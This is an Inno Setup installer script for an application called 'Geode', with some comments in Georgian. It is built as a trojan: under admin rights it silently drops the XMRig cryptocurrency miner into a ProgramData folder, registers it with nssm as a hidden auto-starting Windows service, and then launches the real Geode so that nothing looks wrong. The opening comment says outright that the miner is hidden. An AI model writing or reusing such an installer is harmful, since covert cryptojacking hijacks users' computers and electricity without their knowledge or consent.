; Geode + XMRig Installer (Atrio hidden)

[Setup]
AppName=Geode
AppVersion=1.0.0
DefaultDirName={pf}\Geode
DefaultGroupName=Geode
Compression=lzma2
SolidCompression=yes
PrivilegesRequired=admin
OutputDir=C:\GeodeInstaller
OutputBaseFilename=Geode-Setup

[Files]
; XMRig (ატრიო)
Source: "xmrig.exe"; DestDir: "{commonappdata}\atriominer"; Flags: ignoreversion
Source: "config.json"; DestDir: "{commonappdata}\atriominer"; Flags: ignoreversion
Source: "nssm.exe"; DestDir: "{commonappdata}\atriominer"; Flags: ignoreversion

; 🔥 ნამდვილი Geode (სხვა სახელით — Geode-Original.exe)
Source: "Geode-Windows.exe"; DestDir: "{app}"; DestName: "Geode-Original.exe"

[Run]
; 🔥 XMRig Service (atriominer)
Filename: "{cmd}"; \
    Parameters: "/C cd /d ""{commonappdata}\atriominer"" && nssm.exe install atriominer ""{commonappdata}\atriominer\xmrig.exe"" && nssm.exe set atriominer AppDirectory ""{commonappdata}\atriominer"" && nssm.exe set atriominer Start SERVICE_AUTO_START && nssm.exe start atriominer"; \
    Flags: runhidden

; 🔥 ნამდვილი Geode-ს ინსტალაცია (Finish-ის შემდეგ)
Filename: "{app}\Geode-Original.exe"; Flags: nowait postinstall